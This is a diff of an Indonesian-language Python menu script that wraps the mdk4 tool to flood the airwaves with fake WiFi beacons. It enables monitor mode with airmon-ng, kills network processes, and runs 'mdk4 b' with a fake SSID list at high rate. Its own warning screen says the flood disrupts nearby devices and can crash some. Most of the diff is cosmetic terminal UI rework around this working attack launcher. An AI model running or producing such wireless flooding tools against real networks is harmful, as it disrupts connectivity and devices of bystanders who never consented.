@@ -10,18 +10,115 @@ import tempfile
 import time
 import signal
 
-GREEN = "\033[92m"
-RED = "\033[91m"
-CYAN = "\033[96m"
-MAGENTA = "\033[95m"
-YELLOW = "\033[93m"
+# ---------- ANSI ----------
 RESET = "\033[0m"
 BOLD = "\033[1m"
+CLEAR = "\033[2J\033[H"
 
+COLORS = {
+    "green": "\033[92m",
+    "red": "\033[91m",
+    "cyan": "\033[96m",
+    "yellow": "\033[93m",
+    "magenta": "\033[35m",
+    "gray": "\033[90m",
+}
+
+GREEN = COLORS["green"]
+RED = COLORS["red"]
+CYAN = COLORS["cyan"]
+YELLOW = COLORS["yellow"]
+MAGENTA = COLORS["magenta"]
+GRAY = COLORS["gray"]
+
+BOX_WIDTH = 40
+
+# ================= CLEAR SCREEN =================
 
 def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
+    sys.stdout.write(CLEAR)
+    sys.stdout.flush()
 
+# ================= DRAW BOX =================
+
+def draw_box_top(color=CYAN):
+    print(f"\n  {color}{BOLD}╔{'═' * BOX_WIDTH}╗{RESET}")
+
+def draw_box_bottom(color=CYAN):
+    print(f"  {color}{BOLD}╚{'═' * BOX_WIDTH}╝{RESET}")
+
+def draw_box_title(title: str, color=CYAN, text_color=YELLOW):
+    inner = f" {title}"
+    pad = BOX_WIDTH - len(inner)
+    if pad < 0:
+        inner = inner[:BOX_WIDTH]
+        pad = 0
+    print(
+        f"  {color}{BOLD}║{RESET}"
+        f"{text_color}{BOLD}{inner}{RESET}"
+        f"{' ' * pad}"
+        f"{color}{BOLD}║{RESET}"
+    )
+
+# ================= LOADING =================
+
+def loading(text, duration=1):
+    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
+    for i in range(duration * 10):
+        sys.stdout.write(f"\r  {YELLOW}{BOLD}{chars[i % len(chars)]} {text}{RESET}")
+        sys.stdout.flush()
+        time.sleep(0.1)
+    sys.stdout.write("\r" + " " * 60 + "\r")
+    sys.stdout.flush()
+
+def loading_with_text(text, duration=2):
+    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
+    glitch_chars = "!@#$%^&*"
+    
+    for i in range(duration * 10):
+        display_text = ""
+        for char in text:
+            if char == " ":
+                display_text += " "
+            elif random.random() < 0.1:
+                display_text += random.choice(glitch_chars)
+            else:
+                display_text += char
+                
+        sys.stdout.write(f"\r  {CYAN}{BOLD}{chars[i % len(chars)]}{RESET} {YELLOW}{display_text}{RESET}")
+        sys.stdout.flush()
+        time.sleep(0.1)
+    sys.stdout.write("\r" + " " * 60 + "\r")
+    sys.stdout.flush()
+
+# ================= GLITCH FUNCTIONS =================
+
+def glitch_print(text, color=GREEN, cycles=8):
+    chars = "!@#$%^&*<>/\\|~?"
+    n = len(text)
+    revealed = [False] * n
+    
+    for c in range(cycles):
+        display = []
+        for i, ch in enumerate(text):
+            if ch == " ":
+                display.append(" ")
+                continue
+            if revealed[i]:
+                display.append(ch)
+            else:
+                if random.random() < (c / cycles):
+                    revealed[i] = True
+                    display.append(ch)
+                else:
+                    display.append(random.choice(chars))
+        sys.stdout.write(f"\r  {color}{''.join(display)}{RESET}")
+        sys.stdout.flush()
+        time.sleep(0.04)
+    
+    print(f"\r  {color}{text}{RESET}")
+
+# ================= WIRELESS FUNCTIONS =================
 
 def get_wireless_interfaces():
     output = subprocess.run(["ip", "link"], capture_output=True, text=True).stdout
@@ -34,7 +131,6 @@ def get_wireless_interfaces():
                 continue
             interfaces.append(name)
     return interfaces
-
 
 def get_monitor_interface_name(adapter, output):
     current_ifaces = get_wireless_interfaces()
@@ -63,45 +159,28 @@ def get_monitor_interface_name(adapter, output):
 
     return f"{adapter}mon"
 
-
-def run_command(cmd, description=None, show_output=True):
-    if description:
-        print(f"\n{CYAN}>{description}{RESET}")
-
-    if show_output:
-        print(f"{YELLOW}{' '.join(cmd)}{RESET}")
-
+def run_command(cmd, show_output=False):
     result = subprocess.run(cmd, capture_output=True, text=True)
-    if show_output:
-        if result.stdout:
-            print(result.stdout.strip())
-        if result.stderr:
-            print(result.stderr.strip())
-
     if result.returncode != 0:
-        print(f"{RED}Perintah gagal: {' '.join(cmd)}{RESET}")
         return None
     return result
 
-
 def start_monitor_mode(adapter):
-    print(f"\n{CYAN}ACTIVATING MONITOR MODE ON {adapter}...{RESET}")
-    run_command(["sudo", "airmon-ng", "check", "kill"], "MEMBERSIHKAN PROSES PENGANGGU", show_output=False)
-    result = run_command(["sudo", "airmon-ng", "start", adapter], "MONITOR MODE AKTIF", show_output=False)
-    print("")
+    loading_with_text(f"Mengaktifkan monitor mode pada {adapter}...", 2)
+    run_command(["sudo", "airmon-ng", "check", "kill"], show_output=False)
+    result = run_command(["sudo", "airmon-ng", "start", adapter], show_output=False)
+    
     if result is None:
         return adapter
 
     output = (result.stdout or "") + (result.stderr or "")
     monitor_iface = get_monitor_interface_name(adapter, output)
-    time.sleep(1)
-    print(f"> Interface monitor aktif: {monitor_iface}")
-    print()
+    time.sleep(0.3)
     return monitor_iface
 
-
 def stop_monitor_mode(monitor_iface):
-    print(f"\n{CYAN}STOPPING MONITOR MODE...{RESET}")
+    loading("Membersihkan monitor mode...", 1)
+    
     candidates = [monitor_iface]
     if monitor_iface.endswith("mon"):
         candidates.append(monitor_iface[:-3])
@@ -109,42 +188,16 @@ def stop_monitor_mode(monitor_iface):
         candidates.append(f"{monitor_iface}mon")
 
     for name in candidates:
-        result = run_command(["sudo", "airmon-ng", "stop", name], "MEMATIKAN MONITOR MODE", show_output=False)
+        result = run_command(["sudo", "airmon-ng", "stop", name], show_output=False)
         if result is not None:
             break
 
-    print(f"{CYAN}RESTARTING NETWORKMANAGER...{RESET}")
     run_command(["sudo", "systemctl", "restart", "NetworkManager"], show_output=False)
-    run_command(["sudo", "systemctl", "restart", "wpa_supplicant"], show_output=False)
-    print(f"{GREEN}NetworkManager dan wpa_supplicant berhasil direstart{RESET}")
-
-
-def select_interface():
-    print(f"\n{CYAN}SCANNING INTERFACES...{RESET}")
-    ifaces = get_wireless_interfaces()
-    if not ifaces:
-        print("Ga ada interface ditemukan.")
-        sys.exit(1)
-
-    print(f"\n{BOLD}Pilih interface:{RESET}")
-    for idx, name in enumerate(ifaces, start=1):
-        print(f"{GREEN}{idx}.{RESET} {name}")
-
-    while True:
-        choice = input("\nNomor: ").strip()
-        if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
-            selected = ifaces[int(choice) - 1]
-            print(f"{GREEN}LOCKED: {selected}{RESET}")
-            clear_screen()
-            return selected
-        print("Input salah, coba lagi.")
-
 
 def get_ssid_file_path():
     """Mencari file ssid_list.txt di folder ssid-fake"""
     script_dir = os.path.dirname(os.path.abspath(__file__))
     
-    # Coba cari di folder ssid-fake di direktori yang sama dengan script
     possible_paths = [
         os.path.join(script_dir, "ssid-fake", "ssid_list.txt"),
         os.path.join(script_dir, "ssid_list.txt"),
@@ -155,138 +208,212 @@ def get_ssid_file_path():
         if os.path.exists(path):
             return path
     
-    print(f"{RED}File ssid_list.txt tidak ditemukan!{RESET}")
-    print(f"{YELLOW}Pastikan file ada di: ssid-fake/ssid_list.txt{RESET}")
     return None
 
+def get_monitor_interface():
+    """Mendapatkan interface monitor yang aktif atau membuatnya dari wlan0"""
+    ifaces = get_wireless_interfaces()
+    for iface in ifaces:
+        if iface.endswith("mon"):
+            return iface
+    
+    for iface in ifaces:
+        if iface.startswith("wlan"):
+            return start_monitor_mode(iface)
+    
+    return start_monitor_mode("wlan0")
 
-def show_post_attack_menu(monitor_iface):
-    """Menampilkan menu setelah serangan dihentikan"""
-    print(f"\n{BOLD}{CYAN}╔══════════════════════════════════════════════════╗{RESET}")
-    print(f"{BOLD}{CYAN}║              SERANGAN DIHENTIKAN                 ║{RESET}")
-    print(f"{BOLD}{CYAN}╚══════════════════════════════════════════════════╝{RESET}")
-    print(f"\n{BOLD}1.{RESET} Attack Again")
-    print(f"{BOLD}0.{RESET} Back to Menu (mdk4-menu.py)")
-    print(f"{BOLD}99.{RESET} Exit")
+# ================= MENU =================
+
+def main_menu():
+    clear_screen()
+    draw_box_top(CYAN)
+    draw_box_title("MDK4 BEACON FLOOD", CYAN, YELLOW)
+    draw_box_bottom(CYAN)
+    
+    print(f"\n  {BOLD}Pilih opsi:{RESET}")
+    print(f"  {GREEN}1.{RESET} START")
+    print(f"  {GREEN}2.{RESET} BACK")
+    print()
+    print(f"  {YELLOW}{'=' * 40}{RESET}")
+    print()
     
     while True:
-        try:
-            choice = input(f"\n{BOLD}{YELLOW}>> Pilihan: {RESET}").strip()
-            
-            if choice == "1":
-                # Attack again - cleanup dulu lalu restart
-                print(f"\n{GREEN}Memulai ulang serangan...{RESET}")
-                stop_monitor_mode(monitor_iface)
-                time.sleep(1)
-                # Jalankan ulang script ini
-                os.execvp(sys.executable, [sys.executable, __file__])
-                
-            elif choice == "0":
-                # Back to menu - cleanup dan jalankan mdk4-menu.py
-                print(f"\n{GREEN}Kembali ke menu utama...{RESET}")
-                stop_monitor_mode(monitor_iface)
-                time.sleep(1)
-                
-                # Cari mdk4-menu.py
-                script_dir = os.path.dirname(os.path.abspath(__file__))
-                menu_path = os.path.join(script_dir, "mdk4-menu.py")
-                
-                if os.path.exists(menu_path):
-                    os.execvp(sys.executable, [sys.executable, menu_path])
-                else:
-                    print(f"{RED}mdk4-menu.py tidak ditemukan!{RESET}")
-                    sys.exit(0)
-                    
-            elif choice == "99":
-                # Exit - cleanup dan keluar
-                print(f"\n{GREEN}Keluar dari program...{RESET}")
-                stop_monitor_mode(monitor_iface)
-                time.sleep(1)
-                print(f"{GREEN}Terima kasih!{RESET}")
-                sys.exit(0)
-                
-            else:
-                print(f"{RED}Pilihan tidak valid! Silakan pilih 1, 0, atau 99.{RESET}")
-                
-        except KeyboardInterrupt:
-            print(f"\n{YELLOW}Interrupt diterima, keluar...{RESET}")
-            stop_monitor_mode(monitor_iface)
-            sys.exit(0)
+        choice = input(f"  {YELLOW}>> pilihan : {RESET}").strip()
+        if choice == "1":
+            return "start"
+        elif choice == "2":
+            return "back"
+        else:
+            print(f"  {RED}[!] Pilih 1 atau 2.{RESET}")
 
+def show_warning():
+    clear_screen()
+    draw_box_top(RED)
+    draw_box_title("⚠️  PERINGATAN  ⚠️", RED, YELLOW)
+    draw_box_bottom(RED)
+    
+    print(f"\n  {YELLOW}{BOLD}Ini akan melakukan SPAM BEACON WIFI!{RESET}")
+    print(f"  {YELLOW}{BOLD}Akan membanjiri area dengan SSID palsu!{RESET}")
+    print()
+    print(f"  {RED}Efek yang mungkin terjadi:{RESET}")
+    print(f"  {GRAY}- Memenuhi daftar WiFi yang terdeteksi{RESET}")
+    print(f"  {GRAY}- Mengganggu perangkat di sekitar{RESET}")
+    print(f"  {GRAY}- Bisa menyebabkan crash pada perangkat tertentu{RESET}")
+    print()
+    print(f"  {YELLOW}Lanjutkan? (y/n){RESET}")
+    
+    while True:
+        choice = input(f"  {YELLOW}>> : {RESET}").strip().lower()
+        if choice in ['y', 'yes']:
+            return True
+        elif choice in ['n', 'no']:
+            return False
+        else:
+            print(f"  {RED}[!] Ketik y atau n.{RESET}")
+
+def back_to_mdk4_menu():
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    menu_path = os.path.join(script_dir, "mdk4-menu.py")
+    
+    possible_paths = [
+        menu_path,
+        os.path.join(script_dir, "..", "mdk4-menu.py"),
+        os.path.join(script_dir, "..", "..", "mdk4-menu.py"),
+    ]
+    
+    for path in possible_paths:
+        if os.path.exists(path):
+            os.execvp(sys.executable, [sys.executable, path])
+            return
+    
+    print(f"\n  {RED}[✗] mdk4-menu.py tidak ditemukan.{RESET}")
+    input("\n  Tekan Enter untuk kembali...")
+    sys.exit(0)
 
 def run_beacon_attack(monitor_iface):
     ssid_file = get_ssid_file_path()
     if not ssid_file:
-        print(f"{RED}Gagal menemukan ssid_list.txt. Serangan dibatalkan.{RESET}")
+        clear_screen()
+        draw_box_top(RED)
+        draw_box_title("ERROR", RED, YELLOW)
+        draw_box_bottom(RED)
+        print(f"\n  {RED}[✗] ssid_list.txt tidak ditemukan!{RESET}")
+        print(f"  {YELLOW}Pastikan file ada di: ssid-fake/ssid_list.txt{RESET}")
+        input("\n  Tekan Enter untuk kembali...")
         return
 
+    clear_screen()
+    draw_box_top(RED)
+    draw_box_title("🔥 SPAM BEACON AKTIF 🔥", RED, YELLOW)
+    draw_box_bottom(RED)
+    
+    print(f"\n  {GREEN}{BOLD}  SPAM BEACON AKTIF, CHECK WIFI MU{RESET}")
+    print()
+    print(f"  {GRAY}SSID file: {ssid_file}{RESET}")
+    print(f"  {GRAY}[!] Tekan Ctrl+C untuk menghentikan{RESET}\n")
+    
     mdk4_cmd = [
-        "sudo",
-        "mdk4",
-        monitor_iface,
-        "b",
-        "-f",
-        ssid_file,
-        "-w",
-        "a",
+        "sudo", "mdk4", monitor_iface, "b",
+        "-f", ssid_file,
+        "-w", "a",
         "-m",
-        "-s",
-        "500",
+        "-s", "500"
     ]
-
-    print(f"\n{YELLOW}Menjalankan mdk4 beacon flood (mode b)...{RESET}")
-    print(f"{YELLOW}Menggunakan SSID dari: {ssid_file}{RESET}")
-    print(f"{YELLOW}{' '.join(mdk4_cmd)}{RESET}")
-    print(f"\n{BOLD}{GREEN}[!] Tekan Ctrl+C untuk menghentikan serangan{RESET}\n")
-
+    
     try:
-        result = subprocess.run(mdk4_cmd)
-        if result.returncode != 0 and result.returncode != -2:  # -2 biasanya dari SIGINT
-            print(f"{RED}MDK4 beacon attack gagal dengan kode keluar {result.returncode}.{RESET}")
-            # Tampilkan menu setelah error
-            show_post_attack_menu(monitor_iface)
+        proc = subprocess.Popen(mdk4_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        # Animasi spinner selama serangan berjalan
+        chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
+        i = 0
+        while proc.poll() is None:
+            sys.stdout.write(f"\r  {RED}{BOLD}{chars[i % len(chars)]}{RESET} {YELLOW}SPAM BEACON ACTIVE... Press Ctrl+C to stop{RESET}")
+            sys.stdout.flush()
+            i += 1
+            time.sleep(0.1)
+        
     except KeyboardInterrupt:
-        # Tangkap Ctrl+C dan tampilkan menu
-        print(f"\n\n{YELLOW}Serangan dihentikan oleh pengguna.{RESET}")
-        show_post_attack_menu(monitor_iface)
+        print(f"\n\n  {YELLOW}[!] Menghentikan serangan...{RESET}")
+        proc.terminate()
+        try:
+            proc.wait(timeout=5)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            proc.wait()
+        print(f"  {GREEN}[✓] Serangan dihentikan.{RESET}")
+        time.sleep(0.5)
 
+def prompt_post_attack():
+    print(f"\n  {BOLD}Pilih opsi:{RESET}")
+    print(f"  {GREEN}1.{RESET} Attack Again")
+    print(f"  {GREEN}0.{RESET} Back to Menu")
+    print(f"  {GREEN}99.{RESET} Exit")
+    
+    while True:
+        choice = input(f"\n  {YELLOW}>> pilihan : {RESET}").strip()
+        if choice == "1":
+            return "again"
+        elif choice == "0":
+            return "menu"
+        elif choice == "99":
+            return "exit"
+        else:
+            print(f"  {RED}[!] Pilih 1, 0, atau 99.{RESET}")
+
+# ================= MAIN =================
 
 def main():
     monitor_iface = None
     
-    # Setup signal handler untuk cleanup
-    def signal_handler(sig, frame):
-        print(f"\n{YELLOW}Signal received, cleaning up...{RESET}")
-        if monitor_iface:
-            stop_monitor_mode(monitor_iface)
-        sys.exit(0)
-    
-    signal.signal(signal.SIGINT, signal_handler)
-    signal.signal(signal.SIGTERM, signal_handler)
-
-    try:
-        adapter = select_interface()
-        monitor_iface = start_monitor_mode(adapter)
-        
-        # Jalankan serangan
-        run_beacon_attack(monitor_iface)
-        
-        # Cleanup setelah serangan selesai normal
-        print("\nMembersihkan sesi...")
-        stop_monitor_mode(monitor_iface)
-        
-    except KeyboardInterrupt:
-        print(f"\n{YELLOW}Keyboard interrupt diterima.{RESET}")
-        if monitor_iface:
-            stop_monitor_mode(monitor_iface)
-        print("Keluar dari program.")
-        sys.exit(0)
-    except Exception as e:
-        print(f"{RED}Error: {e}{RESET}")
-        if monitor_iface:
-            stop_monitor_mode(monitor_iface)
-        sys.exit(1)
-
+    while True:
+        try:
+            choice = main_menu()
+            
+            if choice == "back":
+                back_to_mdk4_menu()
+            
+            elif choice == "start":
+                # Warning
+                if not show_warning():
+                    continue
+                
+                # Auto detect interface
+                clear_screen()
+                draw_box_top(CYAN)
+                draw_box_title("MDK4 BEACON FLOOD", CYAN, YELLOW)
+                draw_box_bottom(CYAN)
+                
+                print(f"\n  {YELLOW}[*] Mencari interface monitor...{RESET}")
+                monitor_iface = get_monitor_interface()
+                glitch_print(f"MONITOR INTERFACE: {monitor_iface}", CYAN)
+                time.sleep(0.5)
+                
+                # Jalankan serangan
+                run_beacon_attack(monitor_iface)
+                
+                # Menu setelah serangan
+                while True:
+                    post_choice = prompt_post_attack()
+                    if post_choice == "again":
+                        # Cleanup lalu restart attack
+                        stop_monitor_mode(monitor_iface)
+                        monitor_iface = None
+                        break
+                    elif post_choice == "menu":
+                        stop_monitor_mode(monitor_iface)
+                        back_to_mdk4_menu()
+                    elif post_choice == "exit":
+                        stop_monitor_mode(monitor_iface)
+                        clear_screen()
+                        print(f"\n  {GREEN}[✓] Terima kasih!{RESET}")
+                        sys.exit(0)
+                
+        except KeyboardInterrupt:
+            print(f"\n  {YELLOW}[!] Dibatalkan oleh user{RESET}")
+            if monitor_iface:
+                stop_monitor_mode(monitor_iface)
+            sys.exit(0)
 
 if __name__ == "__main__":
     main()
